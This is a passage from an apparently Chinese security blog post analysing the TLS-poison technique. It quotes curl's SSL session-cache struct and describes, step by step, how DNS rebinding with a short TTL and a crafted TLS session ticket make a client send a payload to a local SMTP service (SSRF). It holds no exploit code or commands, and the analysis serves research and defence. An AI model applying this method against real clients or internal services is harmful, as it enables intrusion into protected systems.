class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x5BF9;&#x4E8E;&#x7AEF;&#x53E3;&#x3001;&#x534F;&#x8BAE;&#x3001;&#x57DF;&#x540D;&#x7684;&#x6BD4;&#x8F83;&#x6765;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x4F7F;&#x7528; sessionid &#xFF0C;&#x800C;<code>check</code>&#x53D8;&#x91CF;&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x5C31;&#x662F;<code>Curl_ssl_session</code>&#xFF0C;&#x5728; lib/urldata.h#295 &#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5BF9;&#x4E8E;<code>Curl_ssl_session</code>&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5B9A;&#x4E49;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* information stored about one single SSL session */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_ssl_session</span> {</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *name;       <span class="hljs-comment">/* host name for which this ID was used */</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *conn_to_host; <span class="hljs-comment">/* host name for the connection (may be NULL) */</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *scheme; <span class="hljs-comment">/* protocol scheme used */</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *sessionid;  <span class="hljs-comment">/* as returned from the SSL layer */</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> idsize;    <span class="hljs-comment">/* if known, otherwise 0 */</span></span><br><span class="line">  <span class="hljs-keyword">long</span> age;         <span class="hljs-comment">/* just a number, the higher the more recent */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> remote_port;  <span class="hljs-comment">/* remote port */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> conn_to_port; <span class="hljs-comment">/* remote port for the connection (may be -1) */</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ssl_primary_config</span> <span class="hljs-title">ssl_config</span>;</span> <span class="hljs-comment">/* setup for this session */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E; curl 7.75.0 &#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;&#x89C4;&#x5219;&#x5C31;&#x662F;&#x7AEF;&#x53E3;&#x76F8;&#x540C;&#x3001;&#x57DF;&#x540D;&#x76F8;&#x540C;&#x3001;&#x534F;&#x8BAE;&#x76F8;&#x540C;&#xFF0C; curl &#x5C31;&#x4F1A;&#x5C1D;&#x8BD5;&#x53BB;&#x4F7F;&#x7528; sessionid &#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x5927;&#x4F53;&#x4E0A;&#x5C31;&#x660E;&#x767D;&#x4E86;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x770B;&#x770B;&#x4F5C;&#x8005;&#x5F53;&#x521D;&#x63D0;&#x51FA;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF0C;&#x76F4;&#x89C2;&#x611F;&#x53D7;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#xFF08;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7528; HTTPS &#x4E3E;&#x4F8B;&#xFF09;&#xFF1A;</p><ol><li>&#x9996;&#x5148;&#x7B2C;&#x4E00;&#x6B65;&#x653B;&#x51FB;&#x8005;&#x53D1;&#x9001;&#x4E00;&#x4E2A; <a href="https://jmaddux.com:25" target="_blank" rel="noopener">https://jmaddux.com:25</a> &#x7684;&#x5730;&#x5740;&#x7ED9;&#x4E00;&#x4E2A; Client &#xFF0C;Client &#x4F1A;&#x9996;&#x5148;&#x8FDB;&#x884C; DNS &#x67E5;&#x8BE2;&#x8BE2;&#x95EE; jmaddux.com &#x7684; IP &#x5730;&#x5740;&#xFF0C;&#x6B64;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x81EA;&#x5DF1;&#x63A7;&#x5236;&#x7684; DNS Server &#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x54CD;&#x5E94;&#x4E3A;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684; IP &#xFF0C;&#x6BD4;&#x5982; 35.x.x.x &#xFF0C;&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7ED9;&#x8FD9;&#x4E2A;&#x54CD;&#x5E94;&#x8BB0;&#x5F55;&#x975E;&#x5E38;&#x77ED;&#x975E;&#x5E38;&#x77ED;&#x7684; TTL &#xFF0C;&#x4EE5;&#x4FBF;&#x8BA9; Client &#x4E0D;&#x8981;&#x7F13;&#x5B58;&#x6211;&#x4EEC;&#x7684; DNS &#x8BB0;&#x5F55;&#x3002;</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/4.jpg" alt></p><ol start="2"><li>&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C; Client &#x4F1A;&#x4E0E;&#x653B;&#x51FB;&#x8005;&#x6307;&#x5B9A;&#x7684; 35.x.x.x &#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x8005;&#x7684;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C; TLS &#x63E1;&#x624B;&#xFF0C;&#x5E76;&#x83B7;&#x5F97;&#x653B;&#x51FB;&#x8005;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x7ED9; Client &#x7684;&#x7279;&#x5236;&#x7684;&#x7968;&#x636E;&#xFF0C;&#x5728;&#x56FE;&#x4E2D;&#x8868;&#x793A;&#x4E3A; Payload &#xFF0C;&#x7136;&#x540E;&#x5B8C;&#x6210; TLS &#x63E1;&#x624B;&#x3002;</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/5.jpg" alt></p><ol start="3"><li>&#x7B2C;&#x4E09;&#x90E8;&#xFF0C;&#x5F53; Client &#x60F3;&#x4E0E; Server &#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x518D;&#x6B21;&#x67E5;&#x627E; jmaddux.com &#x7684; DNS &#x8BB0;&#x5F55;&#xFF0C;&#x7531;&#x4E8E;&#x653B;&#x51FB;&#x8005;&#x4E4B;&#x524D;&#x7ED9;&#x7684; DNS &#x8BB0;&#x5F55; TTL &#x65F6;&#x95F4;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x77ED;&#xFF0C;&#x8BA9;&#x5176;&#x5728;&#x6B64;&#x65F6;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x7F13;&#x5B58;&#x4E2D;&#x67E5;&#x4E0D;&#x5230;&#x539F;&#x6765;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x4F1A;&#x4F7F;&#x5F97; Client &#x53C8;&#x53BB;&#x8BE2;&#x95EE; jmaddux.com &#x7684; DNS &#x8BB0;&#x5F55;&#xFF0C;&#x6B64;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x8BA9;&#x5176; DNS Server &#x8FD4;&#x56DE; 127.0.0.1 &#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x3002;</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/6.jpg" alt></p><ol start="4"><li>&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C; Client &#x4E0D;&#x6821;&#x9A8C;&#x672C;&#x6B21;&#x83B7;&#x5F97;&#x7684; ip &#x662F;&#x5426;&#x4E0E;&#x4E0A;&#x6B21;&#x4E00;&#x81F4;&#xFF0C;&#x5C31;&#x4F1A;&#x5C1D;&#x8BD5;&#x4E0E; 127.0.0.1:25 &#x8FDB;&#x884C; TLS Session Resumption &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C; Client &#x4F1A;&#x62FF;&#x7740;&#x653B;&#x51FB;&#x8005;&#x7279;&#x5236;&#x7684;&#x7968;&#x636E;&#x8BBF;&#x95EE; 127.0.0.1:25 &#xFF0C;&#x5C1D;&#x8BD5;&#x4E0E;&#x4E4B;&#x6062;&#x590D; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x8868;&#x73B0;&#x4E3A; Client &#x53D1;&#x9001;&#x542B;&#x6709; Payload &#x7684; Client Hello &#x6D88;&#x606F;&#x5230; SMTP &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x81F3;&#x6B64;&#x5B8C;&#x6210;&#x4E00;&#x6B21; SSRF &#x653B;&#x51FB;&#x3002;</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/7.jpg" alt></p><p>&#x6574;&#x4F53;&#x7684;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMC